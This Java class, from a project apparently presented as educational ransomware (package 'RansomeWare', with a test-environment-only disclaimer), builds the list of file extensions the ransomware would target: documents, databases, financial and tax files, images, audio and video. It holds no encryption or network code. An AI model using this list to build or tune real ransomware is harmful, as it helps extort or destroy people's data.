/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
  __ / / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 18/07/19
 Version 1.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/
package RansomeWare;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

@SuppressWarnings("MagicConstant")
public class FileTypes {
    public List<String> AllowedTypes = new ArrayList<String>();

    public void addFiles() {
        //Documents
        AllowedTypes.add(".ASC");
        AllowedTypes.add(".CSS");
        AllowedTypes.add(".CSV");
        AllowedTypes.add(".DOC");
        AllowedTypes.add(".DOCM");
        AllowedTypes.add(".DOCX");
        AllowedTypes.add(".DOT");
        AllowedTypes.add(".DOTX");
        AllowedTypes.add(".GDOC");
        AllowedTypes.add(".GSLIDES");
        AllowedTypes.add(".HTML");
        AllowedTypes.add(".LOG");
        AllowedTypes.add(".KEY");
        AllowedTypes.add(".KEYNOTE");
        AllowedTypes.add(".MCW");
        AllowedTypes.add(".ODM");
        AllowedTypes.add(".ODP");
        AllowedTypes.add(".ODOC");
        AllowedTypes.add(".ODT");
        AllowedTypes.add(".OSHEET");
        AllowedTypes.add(".PAGES");
        AllowedTypes.add(".PEZ");
        AllowedTypes.add(".PPS");
        AllowedTypes.add(".PPT");
        AllowedTypes.add(".PDF");
        AllowedTypes.add(".RTF");
        AllowedTypes.add(".TEX");
        AllowedTypes.add(".TSV");
        AllowedTypes.add(".INFO");
        AllowedTypes.add(".TXT");
        AllowedTypes.add(".XML");

        AllowedTypes.add(".AI");
        AllowedTypes.add(".INDD");
        AllowedTypes.add(".PSD");
        AllowedTypes.add(".PMD");
        AllowedTypes.add(".PUB");
        AllowedTypes.add(".XCF");

        AllowedTypes.add(".GSHEET");
        AllowedTypes.add(".NUMBERS");
        AllowedTypes.add(".ODS");
        AllowedTypes.add(".OTS");
        AllowedTypes.add(".WKS");
        AllowedTypes.add(".XLK");
        AllowedTypes.add(".XLS");
        AllowedTypes.add(".XLSB");
        AllowedTypes.add(".XLSM");
        AllowedTypes.add(".XLSM");
        AllowedTypes.add(".XLSX");

        AllowedTypes.add(".JSON");
        AllowedTypes.add(".MD");
        AllowedTypes.add(".BAK");
        AllowedTypes.add(".Bk");
        AllowedTypes.add(".BIN");
        AllowedTypes.add(".DAT");

        //Database
        AllowedTypes.add(".DB");
        AllowedTypes.add(".FRM");
        AllowedTypes.add(".MDA");
        AllowedTypes.add(".MDB");
        AllowedTypes.add(".ADP");
        AllowedTypes.add(".MDF");
        AllowedTypes.add(".ODB");
        AllowedTypes.add(".SDF");
        AllowedTypes.add(".SQL");
        AllowedTypes.add(".SQLITE");

        //Financial
        AllowedTypes.add(".MYO");
        AllowedTypes.add(".MYOB");
        AllowedTypes.add(".TAX");
        AllowedTypes.add(".OFX");
        AllowedTypes.add(".IFX");

        //Graphics
        AllowedTypes.add(".BMP");
        AllowedTypes.add(".DIB");
        AllowedTypes.add(".EXIF");
        AllowedTypes.add(".GIF");
        AllowedTypes.add(".JNG");
        AllowedTypes.add(".JPG");
        AllowedTypes.add(".JPEG");
        AllowedTypes.add(".PNG");
        AllowedTypes.add(".RAW");
        AllowedTypes.add(".SVG");
        AllowedTypes.add(".BLEND");

        //Audio
        AllowedTypes.add(".WAV");
        AllowedTypes.add(".WMA");
        AllowedTypes.add(".MP3");
        AllowedTypes.add(".MP4");
        AllowedTypes.add(".MPEG");
        AllowedTypes.add(".LOGIC");
        AllowedTypes.add(".AUP");
        AllowedTypes.add(".BAND");
        AllowedTypes.add(".CEL");

        //Video
        AllowedTypes.add(".AVI");
        AllowedTypes.add(".M4V");
        AllowedTypes.add(".MOV");
        AllowedTypes.add(".MPG");
        AllowedTypes.add(".FCP");
        AllowedTypes.add(".IMOVIEPROJ");




    }

    FileTypes() {
        addFiles();
    }



}
